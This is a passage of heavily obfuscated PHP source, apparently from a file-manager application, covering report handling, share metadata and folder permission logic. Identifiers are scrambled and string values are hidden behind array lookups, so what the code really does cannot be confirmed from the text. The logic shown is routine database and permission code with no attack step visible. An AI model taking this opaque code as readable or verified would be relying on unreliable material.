: !1; if (!$Ú¯ë·É·[$ßÛ‹®‡Ô[2203]] || $Ú¯ë·É·[$ßÛ‹®‡Ô[2203]][$ßÛ‹®‡Ô[846]] != $ßÛ‹®‡Ô[101]) { unset($Ø¼®»…[$üŸÖ²®ú]); continue; } $³æÙ«© = $Ú¯ë·É·[$ßÛ‹®‡Ô[202]]; $Ú¯ë·É·[$ßÛ‹®‡Ô[100]] = $ˆ»®Š»°[$³æÙ«©] ? $ˆ»®Š»°[$³æÙ«©] : !1; if ($Ú¯ë·É·[$ßÛ‹®‡Ô[100]][$ßÛ‹®‡Ô[524]] == $ßÛ‹®‡Ô[101]) { unset($Ø¼®»…[$üŸÖ²®ú]); } if ($Ú¯ë·É·[$ßÛ‹®‡Ô[100]] != $ßÛ‹®‡Ô[239] && !$Ú¯ë·É·[$ßÛ‹®‡Ô[100]]) { unset($Ø¼®»…[$üŸÖ²®ú]); } } unset($Ú¯ë·É·); $Ø¼®»… = array_values($Ø¼®»…); } private function _makeOrder($ë³ÆÅ¡‡ = '') { $Î¿ÍÌº§ =& $_SERVER[‰‰Ş‚€]; $ÌªÏõ™ù = array($Î¿ÍÌº§[242], $Î¿ÍÌº§[858], $Î¿ÍÌº§[2187], $Î¿ÍÌº§[2188]); $óıáÎÓª = array($Î¿ÍÌº§[541] => $Î¿ÍÌº§[542], $Î¿ÍÌº§[543] => $Î¿ÍÌº§[544]); $›Ñš‡™ü = Input::get($Î¿ÍÌº§[548], $Î¿ÍÌº§[17], $Î¿ÍÌº§[516], $ÌªÏõ™ù); $ï­éÜÈ = Input::get($Î¿ÍÌº§[549], $Î¿ÍÌº§[17], $Î¿ÍÌº§[2204], array($Î¿ÍÌº§[2116], $Î¿ÍÌº§[543])); $ï­éÜÈ = $óıáÎÓª[$ï­éÜÈ]; $ë³ÆÅ¡‡ = $ë³ÆÅ¡‡ . "{$›Ñš‡™ü}\40{$ï­éÜÈ}"; return $this->order($ë³ÆÅ¡‡); } public function reportAdd($Ù’İ³üì) { $Ì†ş½š„ =& $_SERVER[‰‰Ş‚€]; $Öò®†±Î = array($Ì†ş½š„[688] => $Ù’İ³üì[$Ì†ş½š„[688]], $Ì†ş½š„[1820] => USER_ID); if (Model($Ì†ş½š„[2200])->where($Öò®†±Î)->find()) { return !1; } $œ–¨´è¨ = array($Ì†ş½š„[688] => $Ù’İ³üì[$Ì†ş½š„[688]], $Ì†ş½š„[1707] => $Ù’İ³üì[$Ì†ş½š„[1707]], $Ì†ş½š„[202] => $Ù’İ³üì[$Ì†ş½š„[202]], $Ì†ş½š„[561] => $Ù’İ³üì[$Ì†ş½š„[561]], $Ì†ş½š„[1820] => USER_ID, $Ì†ş½š„[43] => $Ù’İ³üì[$Ì†ş½š„[43]], $Ì†ş½š„[544] => $Ù’İ³üì[$Ì†ş½š„[544]]); return Model($Ì†ş½š„[2200])->add($œ–¨´è¨); } public function reportList($†…ßÈ†¼) { $‡§è§şª =& $_SERVER[‰‰Ş‚€]; $çáÌ¨”¤ = array(); if ($†…ßÈ†¼[$‡§è§şª[857]]) { $½ôîâÊ­ = $†…ßÈ†¼[$‡§è§şª[858]] ? $†…ßÈ†¼[$‡§è§şª[858]] : strtotime(date($‡§è§şª[2202])); $çáÌ¨”¤[$‡§è§şª[242]] = array($‡§è§şª[417], array($†…ßÈ†¼[$‡§è§şª[857]], $½ôîâÊ­)); } if (isset($†…ßÈ†¼[$‡§è§şª[43]]) && in_array($†…ßÈ†¼[$‡§è§şª[43]], array($‡§è§şª[101], $‡§è§şª[528], $‡§è§şª[2205], $‡§è§şª[2206], $‡§è§şª[2207]))) { $çáÌ¨”¤[$‡§è§şª[43]] = $†…ßÈ†¼[$‡§è§şª[43]]; } if (isset($†…ßÈ†¼[$‡§è§şª[846]]) && in_array($†…ßÈ†¼[$‡§è§şª[846]], array($‡§è§şª[239], $‡§è§şª[101], $‡§è§şª[528], $‡§è§şª[2205]))) { $çáÌ¨”¤[$‡§è§şª[846]] = $†…ßÈ†¼[$‡§è§şª[846]]; } $–µğ™µÕ = Input::get($‡§è§şª[549], $‡§è§şª[17], $‡§è§şª[2204], array($‡§è§şª[2116], $‡§è§şª[543])); $ÓÜ„ªø¶ = array($‡§è§şª[541] => $‡§è§şª[542], $‡§è§şª[543] => $‡§è§şª[544]); $ıâÚùÒ• = $‡§è§şª[2208] . $ÓÜ„ªø¶[$–µğ™µÕ]; $×ñ£‘Ç¨ = Model($‡§è§şª[2200])->where($çáÌ¨”¤)->order($ıâÚùÒ•)->selectPage(20); if (empty($×ñ£‘Ç¨[$‡§è§şª[454]])) { return array(); } $÷àã¼Ÿ· = array_to_keyvalue_group($×ñ£‘Ç¨[$‡§è§şª[454]], $‡§è§şª[846], $‡§è§şª[688]); if (!empty($÷àã¼Ÿ·[0])) { $†…ßÈ†¼ = $÷àã¼Ÿ·[0]; $çáÌ¨”¤ = array($‡§è§şª[688] => array($‡§è§şª[17], $†…ßÈ†¼)); $—õäæ©º = $this->where($çáÌ¨”¤)->field($‡§è§şª[688])->select(); $—õäæ©º = array_to_keyvalue($—õäæ©º, $‡§è§şª[22], $‡§è§şª[688]); $–›é·Õ† = array_diff($†…ßÈ†¼, $—õäæ©º); if (!empty($–›é·Õ†)) { foreach ($×ñ£‘Ç¨[$‡§è§şª[454]] as $ï©¥ç÷ => $ƒ…¶Ìôı) { if (in_array($ƒ…¶Ìôı[$‡§è§şª[688]], $–›é·Õ†)) { unset($×ñ£‘Ç¨[$‡§è§şª[454]][$ï©¥ç÷]); } } } } $this->_listDataApply($×ñ£‘Ç¨[$‡§è§şª[454]]); return $×ñ£‘Ç¨; } public function reportStatus($ºÁÕ§‹Š) { $¶½Ãëä  =& $_SERVER[‰‰Ş‚€]; $­¾ÇÊ•” = array($¶½Ãëä [491] => $ºÁÕ§‹Š[$¶½Ãëä [491]]); $ıÓè¤ğƒ = Model($¶½Ãëä [2200])->where($­¾ÇÊ•”)->field($¶½Ãëä [2209])->find(); if (!$ıÓè¤ğƒ) { return !1; } $’¼›¡¥ = array($¶½Ãëä [846] => $ºÁÕ§‹Š[$¶½Ãëä [846]]); if ($ºÁÕ§‹Š[$¶½Ãëä [846]] == $¶½Ãëä [2205] && $ıÓè¤ğƒ[$¶½Ãëä [846]] == $¶½Ãëä [2205]) { $’¼›¡¥[$¶½Ãëä [846]] = 0; } $ŸàÃ–Ò§ = Model($¶½Ãëä [2200])->where($­¾ÇÊ•”)->save($’¼›¡¥); if ($ºÁÕ§‹Š[$¶½Ãëä [846]] == $¶½Ãëä [528]) { if ($ıÓè¤ğƒ[$¶½Ãëä [561]] != $¶½Ãëä [239] && $this->shareFileMeta($ıÓè¤ğƒ[$¶½Ãëä [561]])) { $this->shareFileMeta($ıÓè¤ğƒ[$¶½Ãëä [561]], 0); } $this->remove($ıÓè¤ğƒ[$¶½Ãëä [688]]); return !0; } if ($ŸàÃ–Ò§ && $ºÁÕ§‹Š[$¶½Ãëä [846]] == $¶½Ãëä [2205]) { $„°ÜâÙ© = $’¼›¡¥[$¶½Ãëä [846]] == $¶½Ãëä [2205] ? 1 : 0; $this->shareFileMeta($ıÓè¤ğƒ[$¶½Ãëä [561]], $„°ÜâÙ©); $this->removeByFile($ıÓè¤ğƒ[$¶½Ãëä [561]]); } return $ŸàÃ–Ò§; } private function removeByFile($£×öäÏØ) { $ è‘õÛÀ =& $_SERVER[‰‰Ş‚€]; $ºÉÖ•öÙ = Model($ è‘õÛÀ[929])->where(array($ è‘õÛÀ[561] => $£×öäÏØ))->field($ è‘õÛÀ[202])->select(); $¿˜òÕøè = array_to_keyvalue($ºÉÖ•öÙ, $ è‘õÛÀ[22], $ è‘õÛÀ[202]); $–ï‡ö¸Î = array($ è‘õÛÀ[202] => array($ è‘õÛÀ[17], $¿˜òÕøè), $ è‘õÛÀ[582] => 1); $ºÉÖ•öÙ = $this->where($–ï‡ö¸Î)->field($ è‘õÛÀ[688])->select(); if (empty($ºÉÖ•öÙ)) { return; } $Å½Şû¥ = array_to_keyvalue($ºÉÖ•öÙ, $ è‘õÛÀ[22], $ è‘õÛÀ[688]); $this->remove($Å½Şû¥); } private function shareFileMeta($áŠäÒì», $ğÍ†ûŠÔ = null) { $‹„âÔî =& $_SERVER[‰‰Ş‚€]; $¬‰öíè– = array($‹„âÔî[561] => $áŠäÒì», $‹„âÔî[105] => $‹„âÔî[2210]); if (is_null($ğÍ†ûŠÔ)) { return Model($‹„âÔî[2211])->where($¬‰öíè–)->find(); } $¬‰öíè–[$‹„âÔî[459]] = $ğÍ†ûŠÔ; Model($‹„âÔî[2211])->add($¬‰öíè–, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\143\x65\x5f\x61\165\164\x68"; public function getAuth($†õÅ¥Ëø) { $È¡ï« =& $_SERVER[‰‰Ş‚€]; $­×Öé‚Î = $this->sourceAuthSelect($†õÅ¥Ëø); $üáôü¨¢ = array(); $»¨Ëı™œ = array(); $·ÂÃÒÕ = 2 << 25; foreach ($­×Öé‚Î as $¾ÁœİÖ‰) { $œşìÓÙÑ = Model($È¡ï«[591])->listData($¾ÁœİÖ‰[$È¡ï«[2129]]); if (!$œşìÓÙÑ) { continue; } $üáôü¨¢[] = $¾ÁœİÖ‰; $ı¶äİÅ­ = 0; if ($¾ÁœİÖ‰[$È¡ï«[199]] == SourceModel::TYPE_GROUP) { $ı¶äİÅ­ = $·ÂÃÒÕ * 2; } if ($¾ÁœİÖ‰[$È¡ï«[199]] == SourceModel::TYPE_USER) { $ı¶äİÅ­ = $·ÂÃÒÕ; } if ($¾ÁœİÖ‰[$È¡ï«[199]] == SourceModel::TYPE_USER && $¾ÁœİÖ‰[$È¡ï«[589]] == $È¡ï«[239]) { $ı¶äİÅ­ = 0; } $»¨Ëı™œ[] = $œşìÓÙÑ[$È¡ï«[506]] + $ı¶äİÅ­; } array_multisort($»¨Ëı™œ, SORT_DESC, $üáôü¨¢); return $üáôü¨¢; } public function sourceAuthSelect($é®óõ÷) { $ˆ¾ó²¢ =& $_SERVER[‰‰Ş‚€]; static $§èãê€ = array(); $¹ ¬œèÁ = is_array($é®óõ÷) ? !1 : !0; if ($¹ ¬œèÁ) { $é®óõ÷ = array($é®óõ÷); } $± ñÛÛ = array(); foreach ($é®óõ÷ as $ú¼«›¶á) { if (isset($§èãê€[$ú¼«›¶á])) { $± ñÛÛ[$ú¼«›¶á] = $§èãê€[$ú¼«›¶á]; } } if (count($± ñÛÛ) == count($é®óõ÷)) { return $¹ ¬œèÁ ? $± ñÛÛ[$é®óõ÷[0]] : $± ñÛÛ; } $Ã‹”€ = $ˆ¾ó²¢[2212]; $Ø¿ÃŸáÖ = array($ˆ¾ó²¢[202] => array($ˆ¾ó²¢[17], $é®óõ÷)); $·ÅÊÇá = $this->field($Ã‹”€)->order($ˆ¾ó²¢[491])->where($Ø¿ÃŸáÖ)->select(); $‡³÷° = array_to_keyvalue_group($·ÅÊÇá, $ˆ¾ó²¢[202]); foreach ($é®óõ÷ as $ú¼«›¶á) { $§èãê€[$ú¼«›¶á] = $‡³÷°[$ú¼«›¶á] ? $‡³÷°[$ú¼«›¶á] : array(); } if ($¹ ¬œèÁ) { return $·ÅÊÇá; } return $‡³÷°; } public function setAuth($¼²¶¦†‰, $ú¬ì¤ç˜) { $«’•òœ§ =& $_SERVER[‰‰Ş‚€]; $íË›È½Œ = Model($«’•òœ§[1467])->sourceInfo($¼²¶¦†‰); if (!$íË›È½Œ) { return !1; } if ($íË›È½Œ[$«’•òœ§[199]] != SourceModel::TYPE_GROUP) { return !1; } $¢›¯®íù = 1; $Ê«¿ã” = $íË›È½Œ[$«’•òœ§[589]]; if ($Ê«¿ã” != $¢›¯®íù) { $ËÇÊíäÕ = array($«’•òœ§[1429] => $Ê«¿ã”); $çı÷ªè = Model($«’•òœ§[2115])->field($«’•òœ§[1820])->where($ËÇÊíäÕ)->select(); $çı÷ªè = array_to_keyvalue($çı÷ªè, $«’•òœ§[22], $«’•òœ§[1820]); } $Ï…Í«×Í = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ïîƒó• = array(); foreach ($ú¬ì¤ç˜ as $ºµË§Â) { if (!in_array($ºµË§Â[$«’•òœ§[199]], $Ï…Í«×Í)) { show_json(LNG($«’•òœ§[2213]), !1); } if ($Ê«¿ã” != $¢›¯®íù) { if ($ºµË§Â[$«’•òœ§[199]] == SourceModel::TYPE_GROUP) { } if ($ºµË§Â[$«’•òœ§[589]] != 0 && !in_array($ºµË§Â[$«’•òœ§[589]], $çı÷ªè)) { } } if ($ºµË§Â[$«’•òœ§[589]] == 0) { $ºµË§Â[$«’•òœ§[199]] = SourceModel::TYPE_USER; } $ïîƒó•[] = array($«’•òœ§[202] => $¼²¶¦†‰, $«’•òœ§[199] => intval($ºµË§Â[$«’•òœ§[199]]), $«’•òœ§[589] => intval($ºµË§Â[$«’•òœ§[589]]), $«’•òœ§[2129] => intval($ºµË§Â[$«’•òœ§[2129]]) ? intval($ºµË§Â[$«’•òœ§[2129]]) : 0, $«’•òœ§[2192] => intval($ºµË§Â[$«’•òœ§[2192]]) ? intval($ºµË§Â[$«’•òœ§[2192]]) : -1); } $this->where(array($«’•òœ§[510] => $¼²¶¦†‰))->delete(); $this->addAll($ïîƒó•); return !0; } public function authClear($âÒ‹¯ñû) { $ÃãÀ©°Ï =& $_SERVER[‰‰Ş‚€]; $¬Ñæóº… = Model($ÃãÀ©°Ï[1467])->sourceInfo($âÒ‹¯ñû); $Ñî¢ı›² = array($âÒ‹¯ñû); if ($¬Ñæóº…[$ÃãÀ©°Ï[504]] == $ÃãÀ©°Ï[101]) { $éšÒ÷æÒ = array($ÃãÀ©°Ï[675] => array($ÃãÀ©°Ï[635], $¬Ñæóº…[$ÃãÀ©°Ï[604]] . $âÒ‹¯ñû . $ÃãÀ©°Ï[636])); $Ñî¢ı›² = Model($ÃãÀ©°Ï[1467])->field($ÃãÀ©°Ï[510])->where($éšÒ÷æÒ)->getField($ÃãÀ©°Ï[202], !0); $Ñî¢ı›²[] = $âÒ‹¯ñû; } $this->where(array($ÃãÀ©°Ï[510] => array($ÃãÀ©°Ï[511], $Ñî¢ı›²)))->delete(); return !0; } public function getAllParent($ â—á©÷) { $ÉöÀÍˆ =& $_SERVER[‰‰Ş‚€]; $®İæìŒÖ = Model($ÉöÀÍˆ[1467])->sourceInfo($ â—á©÷); if (!$®İæìŒÖ || $®İæìŒÖ[$ÉöÀÍˆ[199]] != SourceModel::TYPE_GROUP) { return array(); } $±Â©­ş¡ = Model($ÉöÀÍˆ[1467])->parentLevelArray($®İæìŒÖ[$ÉöÀÍˆ[604]]); $…í™¢¯ˆ = array_merge(array(intval($ â—á©÷)), array_reverse($±Â©­ş¡)); $šÙÍØ¼» = $this->sourceAuthSelect($…í™¢¯ˆ); $´¿ĞÙ’š = $GLOBALS[$ÉöÀÍˆ[16]][$ÉöÀÍˆ[102]][$ÉöÀÍˆ[2128]] == 1; $û©àÖ¼÷ = $´¿ĞÙ’š ? 3 : 2; $ÂîÌø­õ = Model($ÉöÀÍˆ[1427])->getInfo($®İæìŒÖ[$ÉöÀÍˆ[589]]); $¡¹°›Õˆ = explode($ÉöÀÍˆ[60], trim($ÂîÌø­õ[$ÉöÀÍˆ[604]], $ÉöÀÍˆ[60])); $Ë§“¾ = array_merge(array($ÂîÌø­õ[$ÉöÀÍˆ[1429]]), array_reverse(array_slice($¡¹°›Õˆ, $û©àÖ¼÷))); foreach ($šÙÍØ¼» as $ â—á©÷ => $Úöš©…) { foreach ($Úöš©… as $÷¥şÍÔÁ) { if (!$÷¥şÍÔÁ || !$÷¥şÍÔÁ[$ÉöÀÍˆ[589]] || $÷¥şÍÔÁ[$ÉöÀÍˆ[589]] == $ÉöÀÍˆ[239]) { continue; } if ($÷¥şÍÔÁ[$ÉöÀÍˆ[199]] != SourceModel::TYPE_GROUP) { continue; } $Ë§“¾[] = $÷¥şÍÔÁ[$ÉöÀÍˆ[589]]; } } $Ë§“¾ = array_unique($Ë§“¾); $îëì÷ë¦ = array($ÉöÀÍˆ[437] => _get($GLOBALS[$ÉöÀÍˆ[17]], $ÉöÀÍˆ[437], 1), $ÉöÀÍˆ[448] => _get($GLOBALS[$ÉöÀÍˆ[17]], $ÉöÀÍˆ[448], 500)); $GLOBALS[$ÉöÀÍˆ[17]][$ÉöÀÍˆ[437]] = 1; $GLOBALS[$ÉöÀÍˆ[17]][$ÉöÀÍˆ[448]] = 500; $Üûë¢Í× = array($ÉöÀÍˆ[512] => 0, $ÉöÀÍˆ[2026] => AuthModel::authAll(), $ÉöÀÍˆ[513] => LNG($ÉöÀÍˆ[2214]), $ÉöÀÍˆ[2043] => $ÉöÀÍˆ[2215]); $¾©¿Îøå = array(); $ĞÂ‹‹»Í = explode($ÉöÀÍˆ[60], $ÉöÀÍˆ[2216]); $ÕŠëÆı¹ = explode($ÉöÀÍˆ[60], $ÉöÀÍˆ[2217]); foreach ($Ë§“¾ as $è¼ìå) { $²»ÃÔ­§ = Model($ÉöÀÍˆ[1427])->getInfo($è¼ìå); $ ïçª„æ = array_field_key($²»ÃÔ­§, $ĞÂ‹‹»Í); $‹şé¢²È = Model($ÉöÀÍˆ[617])->listByGroup($è¼ìå); foreach ($‹şé¢²È[$ÉöÀÍˆ[454]] as $ûÙ™Å¡ => $±í¬´‡¥) { $this->userGroupList($±í¬´‡¥[$ÉöÀÍˆ[1820]], $±í¬´‡¥); $ôúÑíá¹ = $±í¬´‡¥[$ÉöÀÍˆ[1820]] . $ÉöÀÍˆ[22]; if (isset($¾©¿Îøå[$ôúÑíá¹])) { continue; } $éï¿Ûª = Model($ÉöÀÍˆ[2218])->listData($±í¬´‡¥[$ÉöÀÍˆ[2219]]); $±í¬´‡¥[$ÉöÀÍˆ[2220]] = Action($ÉöÀÍˆ[2221])->parseUrl($±í¬´‡¥[$ÉöÀÍˆ[2220]]); $±í¬´‡¥[$ÉöÀÍˆ[1784]] = $éï¿Ûª && $éï¿Ûª[$ÉöÀÍˆ[2222]] == 1; $ÆŸÜÉ«Ö = $this->groupRootAuth($è¼ìå, $±í¬´‡¥[$ÉöÀÍˆ[1820]]); $ÆŸÜÉ«Ö = $±í¬´‡¥[$ÉöÀÍˆ[1784]] ? $Üûë¢Í× : $ÆŸÜÉ«Ö; $¾©¿Îøå[$ôúÑíá¹] = array($ÉöÀÍˆ[2223] => $ÉöÀÍˆ[2224], $ÉöÀÍˆ[2225] => LNG($ÉöÀÍˆ[2226]), $ÉöÀÍˆ[2203] => array_field_key($±í¬´‡¥, $ÕŠëÆı¹), $ÉöÀÍˆ[506] => $ÆŸÜÉ«Ö, $ÉöÀÍˆ[507] => $ÆŸÜÉ«Ö[$ÉöÀÍˆ[506]], $ÉöÀÍˆ[2227] => $ ïçª„æ); } } $GLOBALS[$ÉöÀÍˆ[17]][$ÉöÀÍˆ[437]] = $îëì÷ë¦[$ÉöÀÍˆ[437]]; $GLOBALS[$ÉöÀÍˆ[17]][$ÉöÀÍˆ[448]] = $îëì÷ë¦[$ÉöÀÍˆ[448]]; foreach ($šÙÍØ¼» as $ â—á©÷ => $Úöš©…) { if (!$Úöš©…) { continue; } foreach ($Úöš©… as $÷¥şÍÔÁ) { if (!$÷¥şÍÔÁ || !$÷¥şÍÔÁ[$ÉöÀÍˆ[589]] || $÷¥şÍÔÁ[$ÉöÀÍˆ[589]] == $ÉöÀÍˆ[239]) { continue; } if ($÷¥şÍÔÁ[$ÉöÀÍˆ[199]] != SourceModel::TYPE_USER) { continue; } $ôúÑíá¹ = $÷¥şÍÔÁ[$ÉöÀÍˆ[589]] . $ÉöÀÍˆ[22]; if (isset($¾©¿Îøå[$ôúÑíá¹])) { continue; } $ï¤«éåÙ = $this->authMake($Úöš©…, $ôúÑíá¹); if (!$ï¤«éåÙ || !$ï¤«éåÙ[$ÉöÀÍˆ[2225]]) { continue; } $¾©¿Îøå[$ôúÑíá¹] = array($ÉöÀÍˆ[2223] => $ÉöÀÍˆ[2228], $ÉöÀÍˆ[2225] => $ï¤«éåÙ[$ÉöÀÍˆ[2225]], $ÉöÀÍˆ[2203] => Model($ÉöÀÍˆ[617])->getInfoSimpleOuter($ôúÑíá¹), $ÉöÀÍˆ[506] => $ï¤«éåÙ[$ÉöÀÍˆ[560]], $ÉöÀÍˆ[507] => $ï¤«éåÙ[$ÉöÀÍˆ[560]][$ÉöÀÍˆ[506]], $ÉöÀÍˆ[2227] => $ï¤«éåÙ[$ÉöÀÍˆ[2229]]); } } foreach ($šÙÍØ¼» as $ â—á©÷ => $Úöš©…) { if (!$Úöš©…) { continue; } foreach ($¾©¿Îøå as $ôúÑíá¹ => $Ñæ¶”Ú) { if ($Ñæ¶”Ú[$ÉöÀÍˆ[2203]][$ÉöÀÍˆ[1784]] || $Ñæ¶”Ú[$ÉöÀÍˆ[2223]] == $ÉöÀÍˆ[2228]) { continue; } $ï¤«éåÙ = $this->authMake($Úöš©…, $ôúÑíá¹); if (!$ï¤«éåÙ || !$ï¤«éåÙ[$ÉöÀÍˆ[2225]]) { continue; } $¾©¿Îøå[$ôúÑíá¹] = array($ÉöÀÍˆ[2223] => $ÉöÀÍˆ[2228], $ÉöÀÍˆ[2225] => $ï¤«éåÙ[$ÉöÀÍˆ[2225]], $ÉöÀÍˆ[2203] => $Ñæ¶”Ú[$ÉöÀÍˆ[2203]], $ÉöÀÍˆ[506] => $ï¤«éåÙ[$ÉöÀÍˆ[560]], $ÉöÀÍˆ[507] => $ï¤«éåÙ[$ÉöÀÍˆ[560]][$ÉöÀÍˆ[506]], $ÉöÀÍˆ[2227] => $ï¤«éåÙ[$ÉöÀÍˆ[2229]]); } } $¾©¿Îøå = array_sort_by($¾©¿Îøå, $ÉöÀÍˆ[507], $ÉöÀÍˆ[544]); return $¾©¿Îøå; } public function getAllChildren($»á¤­¦¡) { $üø×ôÂ² =& $_SERVER[‰‰Ş‚€]; $—®“îãë = Model($üø×ôÂ²[1467])->sourceInfo($»á¤­¦¡); if ($—®“îãë[$üø×ôÂ²[504]] != $üø×ôÂ²[101]) { return $this->sourceListAuth(array($»á¤­¦¡)); } if ($—®“îãë[$üø×ôÂ²[199]] != SourceModel::TYPE_GROUP) { return array(); } $®ü®¤Â = 1; $œŒ¥¡ç = array($»á¤­¦¡); if ($—®“îãë[$üø×ôÂ²[201]] == $üø×ôÂ²[239] && $—®“îãë[$üø×ôÂ²[589]] != $®ü®¤Â) { $œŒ¥¡ç = $this->groupChidldAllRootSource($—®“îãë[$üø×ôÂ²[589]]); } $Ïê«şƒø = $this->field($üø×ôÂ²[202])->group($üø×ôÂ²[202])->select(); $Ïê«şƒø = array_to_keyvalue($Ïê«şƒø, $üø×ôÂ²[22], $üø×ôÂ²[202]); if (!$Ïê«şƒø) { return array(); } $ÜÛãí– = $üø×ôÂ²[2230]; $ù°Ê“àÄ = array($üø×ôÂ²[202] => array($üø×ôÂ²[17], $Ïê«şƒø), $üø×ôÂ²[524] => $üø×ôÂ²[239]); $Çæî˜ïõ = Model($üø×ôÂ²[929])->field($ÜÛãí–)->where($ù°Ê“àÄ)->select(); $”‚ßÎİ± = array($»á¤­¦¡); foreach ($Çæî˜ïõ as $æâÅò‚£) { foreach ($œŒ¥¡ç as $åÚš¸È) { $…›´Øñ = $üø×ôÂ²[60] . $åÚš¸È . $üø×ôÂ²[60]; $ß„Â‹ú¼ = $æâÅò‚£[$üø×ôÂ²[604]] . $æâÅò‚£[$üø×ôÂ²[202]] . $üø×ôÂ²[60]; if (strstr($ß„Â‹ú¼, $…›´Øñ)) { $”‚ßÎİ±[] = $æâÅò‚£[$üø×ôÂ²[202]]; break; } } } return $this->sourceListAuth($”‚ßÎİ±); } private function sourceListAuth($Æùü«ú) { $ºÁ¯Êƒ¡ =& $_SERVER[‰‰Ş‚€]; $Ìö¢Á‘ = Model($ºÁ¯Êƒ¡[1467])->sourceListInfo($Æùü«ú, !0); $Êçáİ³ = $this->sourceAuthSelect($Æùü«ú); $¦ÄÏıµ´ = array(); $±Ó¥ò±ô = array(); foreach ($Ìö¢Á‘ as $‘™Ü—ÜÊ) { unset($‘™Ü—ÜÊ[$ºÁ¯Êƒ¡[547]]); unset($‘™Ü—ÜÊ[$ºÁ¯Êƒ¡[545]]); unset($‘™Ü—ÜÊ[$ºÁ¯Êƒ¡[506]]); unset($‘™Ü—ÜÊ[$ºÁ¯Êƒ¡[100]]); $Ş—û›ƒÓ = $Êçáİ³[$‘™Ü—ÜÊ[$ºÁ¯Êƒ¡[202]]]; if (!$Ş—û›ƒÓ) { continue; } $‘™Ü—ÜÊ[$ºÁ¯Êƒ¡[2227]] = $this->authTargetInfo($Ş—û›ƒÓ); $‘™Ü—ÜÊ[$ºÁ¯Êƒ¡[602]] = rtrim($‘™Ü—ÜÊ[$ºÁ¯Êƒ¡[608]], $ºÁ¯Êƒ¡[18]) . $ºÁ¯Êƒ¡[18] . ltrim($‘™Ü—ÜÊ[$ºÁ¯Êƒ¡[602]], $ºÁ¯Êƒ¡[18]); $¦ÄÏıµ´[] = $‘™Ü—ÜÊ; $±ºŒÇû¤ = count(explode($ºÁ¯Êƒ¡[18], trim($‘™Ü—ÜÊ[$ºÁ¯Êƒ¡[602]], $ºÁ¯Êƒ¡[18]))); $±Ó¥ò±ô[] = $±ºŒÇû¤ + ($‘™Ü—ÜÊ[$ºÁ¯Êƒ¡[43]] == $ºÁ¯Êƒ¡[88] ? 0 : 1000); } array_multisort($±Ó¥ò±ô, SORT_ASC, $¦ÄÏıµ´); return $¦ÄÏıµ´; } private function groupChidldAllRootSource($¥ÓİåğŸ) { $ë·„À¡¤ =& $_SERVER[‰‰Ş‚€]; $åŒŞ•› = Model($ë·„À¡¤[1427])->groupChildrenAll($¥ÓİåğŸ); $îıË¨¼¹ = array($ë·„À¡¤[201] => 0, $ë·„À¡¤[589] => array($ë·„À¡¤[17], $åŒŞ•›), $ë·„À¡¤[199] => SourceModel::TYPE_GROUP); $›Ä¥ıĞ› = Model($ë·„À¡¤[929])->field($ë·„À¡¤[202])->where($îıË¨¼¹)->select(); $›Ä¥ıĞ› = array_to_keyvalue($›Ä¥ıĞ›, $ë·„À¡¤[22], $ë·„À¡¤[202]); return $›Ä¥ıĞ›; } private function authTargetInfo($éØ£™Ù¯) { $ÁˆÁ°µÇ =& $_SERVER[‰‰Ş‚€]; $¦Ì–ñúª = array(); $·æ¿İÇ¨ = array(); $ù—çòÑ× = 2 << 25; foreach ($éØ£™Ù¯ as $Ûûé¤ƒ¾) { $€²ÏïØÀ = Model($ÁˆÁ°µÇ[591])->listData($Ûûé¤ƒ¾[$ÁˆÁ°µÇ[2129]]); if (!$€²ÏïØÀ) { continue; } if ($Ûûé¤ƒ¾[$ÁˆÁ°µÇ[199]] == SourceModel::TYPE_USER) { $´×£÷ÏÆ = Model($ÁˆÁ°µÇ[597])->getInfoSimpleOuter($Ûûé¤ƒ¾[$ÁˆÁ°µÇ[589]]); if ($´×£÷ÏÆ[$ÁˆÁ°µÇ[1820]] == $ÁˆÁ°µÇ[1312]) { continue; } if ($´×£÷ÏÆ[$ÁˆÁ°µÇ[1820]] == $ÁˆÁ°µÇ[239]) { $´×£÷ÏÆ[$ÁˆÁ°µÇ[42]] = LNG($ÁˆÁ°µÇ[2231]); } } else { $´×£÷ÏÆ = Model($ÁˆÁ°µÇ[605])->getInfoSimple($Ûûé¤ƒ¾[$ÁˆÁ°µÇ[589]]); } if (!$´×£÷ÏÆ) { continue; } $´×£÷ÏÆ[$ÁˆÁ°µÇ[560]] = $€²ÏïØÀ; $¦Ì–ñúª[] = $´×£÷ÏÆ; $¾éó¯÷İ = 0; if ($Ûûé¤ƒ¾[$ÁˆÁ°µÇ[199]] == SourceModel::TYPE_GROUP) { $¾éó¯÷İ = $ù—çòÑ× * 2; } if ($Ûûé¤ƒ¾[$ÁˆÁ°µÇ[199]] == SourceModel::TYPE_USER) { $¾éó¯÷İ = $ù—çòÑ×; } if ($Ûûé¤ƒ¾[$ÁˆÁ°µÇ[199]] == SourceModel::TYPE_USER && $Ûûé¤ƒ¾[$ÁˆÁ°µÇ[589]] == $ÁˆÁ°µÇ[239]) { $¾éó¯÷İ = 0; } $·æ¿İÇ¨[] = $€²ÏïØÀ[$ÁˆÁ°µÇ[506]] + $¾éó¯÷İ; } array_multisort($·æ¿İÇ¨, SORT_DESC, $¦Ì–ñúª); return $¦Ì–ñúª; } public function getAllChildrenByUser($…ü‘û, $ÒÑÚøË„) { $íÀ„İÚ¼ =& $_SERVER[‰‰Ş‚€]; $¿ÒƒØƒÙ = Model($íÀ„İÚ¼[617])->getInfo($ÒÑÚøË„); if (!$ÒÑÚøË„ || !$…ü‘û || !$¿ÒƒØƒÙ) { return array(); } $ñà¯²›ç = Model($íÀ„İÚ¼[1467])->sourceInfo($…ü‘û); $ÜÁ•¿ªÂ = array(); $ˆñô…ô¹ = 1; if ($ñà¯²›ç[$íÀ„İÚ¼[201]] == $íÀ„İÚ¼[239] && $ñà¯²›ç[$íÀ„İÚ¼[589]] != $ˆñô…ô¹ && $this->groupContainUser($ñà¯²›ç[$íÀ„İÚ¼[589]], $ÒÑÚøË„)) { foreach ($¿ÒƒØƒÙ[$íÀ„İÚ¼[1428]] as $ù Ì‡²ˆ) { $­…öäº = Model($íÀ„İÚ¼[605])->getInfo($ù Ì‡²ˆ[$íÀ„İÚ¼[1429]]); $ÍœÜ÷ä¤ = Model($íÀ„İÚ¼[617])->getInfoSimpleOuter($ÒÑÚøË„); $ÍœÜ÷ä¤[$íÀ„İÚ¼[560]] = $ù Ì‡²ˆ[$íÀ„İÚ¼[506]]; if (Model($íÀ„İÚ¼[591])->authCheckAction($ù 